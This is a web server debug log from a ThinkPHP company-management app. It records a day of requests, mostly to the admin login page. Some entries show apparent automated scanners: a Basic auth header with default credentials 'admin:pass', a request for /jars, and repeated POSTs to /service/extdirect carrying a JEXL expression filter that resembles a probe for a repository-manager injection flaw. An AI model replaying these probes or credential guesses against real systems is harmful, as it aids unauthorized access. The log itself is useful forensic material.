[ 2020-12-29T09:51:07+08:00 ] 45.155.205.108 GET 113.104.218.134:8081/
[运行时间：0.005142s] [吞吐率：194.47req/s] [内存消耗：489.99kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'authorization' => 'Basic YWRtaW46cGFzcw==',
  'content-type' => 'application/json',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T09:51:07+08:00 ] 45.155.205.108 GET 113.104.218.134:8081/jars
[运行时间：0.005148s] [吞吐率：194.24req/s] [内存消耗：497.22kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'content-type' => 'application/json',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/jars' => '',
)
---------------------------------------------------------------
[ 2020-12-29T09:51:07+08:00 ] 45.155.205.108 GET 113.104.218.134:8081/padmin/adminlogin/index.html
[运行时间：0.003574s] [吞吐率：279.81req/s] [内存消耗：486.88kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'authorization' => 'Basic YWRtaW46cGFzcw==',
  'content-type' => 'application/json',
  'referer' => 'http://113.104.218.134:8081/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T09:51:07+08:00 ] 45.155.205.108 POST 113.104.218.134:8081/service/extdirect
[运行时间：0.020021s] [吞吐率：49.95req/s] [内存消耗：469.13kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'content-length' => '293',
  'content-type' => 'application/json',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/service/extdirect' => '',
  'action' => 'coreui_Component',
  'data' => 
  array (
    0 => 
    array (
      'filter' => 
      array (
        0 => 
        array (
          'property' => 'repositoryName',
          'value' => '*',
        ),
        1 => 
        array (
          'property' => 'expression',
          'value' => '1==1',
        ),
        2 => 
        array (
          'property' => 'type',
          'value' => 'jexl',
        ),
      ),
      'limit' => '50',
      'page' => '1',
      'sort' => 
      array (
        0 => 
        array (
          'direction' => 'ASC',
          'property' => 'name',
        ),
      ),
      'start' => '0',
    ),
  ),
  'method' => 'previewAssets',
  'tid' => '18',
  'type' => 'rpc',
)
---------------------------------------------------------------
[ 2020-12-29T09:51:08+08:00 ] 45.155.205.108 GET 113.104.218.134:8081/padmin/adminlogin/index.html
[运行时间：0.002852s] [吞吐率：350.64req/s] [内存消耗：486.55kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'content-type' => 'application/json',
  'referer' => 'http://113.104.218.134:8081/jars',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T12:24:10+08:00 ] 60.191.125.35 HEAD 112.124.42.80:63435http://112.124.42.80:63435/
[运行时间：0.003397s] [吞吐率：294.38req/s] [内存消耗：491.63kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'bs_real_ip' => 'TmpBdU1Ua3hMakV5TlM0ek5RPT0=',
  'host' => '112.124.42.80:63435',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'proxy-connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T12:24:10+08:00 ] 60.191.125.35 GET 112.124.42.80:63435http://112.124.42.80:63435/padmin/adminlogin/index.html
[运行时间：0.003950s] [吞吐率：253.17req/s] [内存消耗：486.89kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'PHPSESSID=qv68tc442tki3l2qusdai2kt46',
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'bs_real_ip' => 'TmpBdU1Ua3hMakV5TlM0ek5RPT0=',
  'host' => '112.124.42.80:63435',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'proxy-connection' => 'keep-alive',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T14:20:48+08:00 ] 192.168.10.58 GET 192.168.10.232/padmin/adminlogin/index.html
[运行时间：0.003543s] [吞吐率：282.25req/s] [内存消耗：487.84kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '192.168.10.232',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-language' => 'en-US,en;q=0.5',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://192.168.10.232/padmin/adminlogin/index.html',
  'connection' => 'keep-alive',
  'cookie' => 'Hm_lvt_d214947968792b839fd669a4decaaffc=1606360106,1606707630',
  'upgrade-insecure-requests' => '1',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T16:09:08+08:00 ] 89.248.168.108 HEAD /
[运行时间：0.228528s] [吞吐率：4.38req/s] [内存消耗：759.39kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T18:06:20+08:00 ] 45.155.205.108 GET 113.104.218.134:8081/jars
[运行时间：0.009512s] [吞吐率：105.13req/s] [内存消耗：498.12kb] [文件加载：76]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'content-type' => 'application/json',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/jars' => '',
)
---------------------------------------------------------------
[ 2020-12-29T18:06:20+08:00 ] 45.155.205.108 GET 113.104.218.134:8081/
[运行时间：0.011917s] [吞吐率：83.91req/s] [内存消耗：490.89kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'authorization' => 'Basic YWRtaW46cGFzcw==',
  'content-type' => 'application/json',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T18:06:21+08:00 ] 45.155.205.108 GET 113.104.218.134:8081/padmin/adminlogin/index.html
[运行时间：0.007873s] [吞吐率：127.02req/s] [内存消耗：488.98kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'authorization' => 'Basic YWRtaW46cGFzcw==',
  'content-type' => 'application/json',
  'referer' => 'http://113.104.218.134:8081/',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T18:06:21+08:00 ] 45.155.205.108 POST 113.104.218.134:8081/service/extdirect
[运行时间：0.010858s] [吞吐率：92.10req/s] [内存消耗：471.59kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'content-length' => '293',
  'content-type' => 'application/json',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/service/extdirect' => '',
  'action' => 'coreui_Component',
  'data' => 
  array (
    0 => 
    array (
      'filter' => 
      array (
        0 => 
        array (
          'property' => 'repositoryName',
          'value' => '*',
        ),
        1 => 
        array (
          'property' => 'expression',
          'value' => '1==1',
        ),
        2 => 
        array (
          'property' => 'type',
          'value' => 'jexl',
        ),
      ),
      'limit' => '50',
      'page' => '1',
      'sort' => 
      array (
        0 => 
        array (
          'direction' => 'ASC',
          'property' => 'name',
        ),
      ),
      'start' => '0',
    ),
  ),
  'method' => 'previewAssets',
  'tid' => '18',
  'type' => 'rpc',
)
---------------------------------------------------------------
[ 2020-12-29T18:06:21+08:00 ] 45.155.205.108 GET 113.104.218.134:8081/padmin/adminlogin/index.html
[运行时间：0.006938s] [吞吐率：144.13req/s] [内存消耗：487.45kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'content-type' => 'application/json',
  'referer' => 'http://113.104.218.134:8081/jars',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T22:00:52+08:00 ] 45.76.144.219 GET 113.104.218.134:8081/
[运行时间：0.003006s] [吞吐率：332.67req/s] [内存消耗：489.33kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'user-agent' => 'python-requests/2.18.4',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T22:00:53+08:00 ] 45.76.144.219 GET 113.104.218.134:8081/
[运行时间：0.002412s] [吞吐率：414.62req/s] [内存消耗：489.33kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'user-agent' => 'python-requests/2.18.4',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T22:17:01+08:00 ] 218.64.60.219 GET 113.104.218.134:8081/
[运行时间：0.003124s] [吞吐率：320.10req/s] [内存消耗：489.27kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'connection' => 'Keep-Alive',
  'user-agent' => 'Apache-HttpClient/4.5.6 (Java/1.8.0_112)',
  'accept-encoding' => 'gzip,deflate',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T22:17:02+08:00 ] 218.64.60.219 GET 113.104.218.134:8081/padmin/adminlogin/index.html
[运行时间：0.003193s] [吞吐率：313.17req/s] [内存消耗：485.98kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'connection' => 'Keep-Alive',
  'user-agent' => 'Apache-HttpClient/4.5.6 (Java/1.8.0_112)',
  'cookie' => 'PHPSESSID=cb95l3tfk4v80m9b5hv46jl42i',
  'accept-encoding' => 'gzip,deflate',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
---------------------------------------------------------------
[ 2020-12-29T22:17:04+08:00 ] 115.148.152.102 GET 113.104.218.134:8081/
[运行时间：0.003214s] [吞吐率：311.13req/s] [内存消耗：489.27kb] [文件加载：75]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => '',
  'route' => 'index/index',
  'option' => 
  array (
    'merge_rule_regex' => false,
    'complete_match' => true,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'connection' => 'Keep-Alive',
  'user-agent' => 'Apache-HttpClient/4.5.6 (Java/1.8.0_112)',
  'accept-encoding' => 'gzip,deflate',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[ 2020-12-29T22:17:04+08:00 ] 115.148.152.102 GET 113.104.218.134:8081/padmin/adminlogin/index.html
[运行时间：0.002901s] [吞吐率：344.70req/s] [内存消耗：485.98kb] [文件加载：74]
[ info ] [ LANG ] /var/www/html/compmgmt/thinkphp/lang/zh-cn.php
[ info ] [ LANG ] /var/www/html/compmgmt/application/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'host' => '113.104.218.134:8081',
  'connection' => 'Keep-Alive',
  'user-agent' => 'Apache-HttpClient/4.5.6 (Java/1.8.0_112)',
  'cookie' => 'PHPSESSID=ke0d8rcnsb90d46v38ubha0oqh',
  'accept-encoding' => 'gzip,deflate',
)
[ info ] [ PARAM ] array (
  '/padmin/adminlogin/index_html' => '',
)
[ info ] [ VIEW ] /var/www/html/compmgmt/application/padmin/view/index/login.html [ array (
  0 => 'title',
) ]
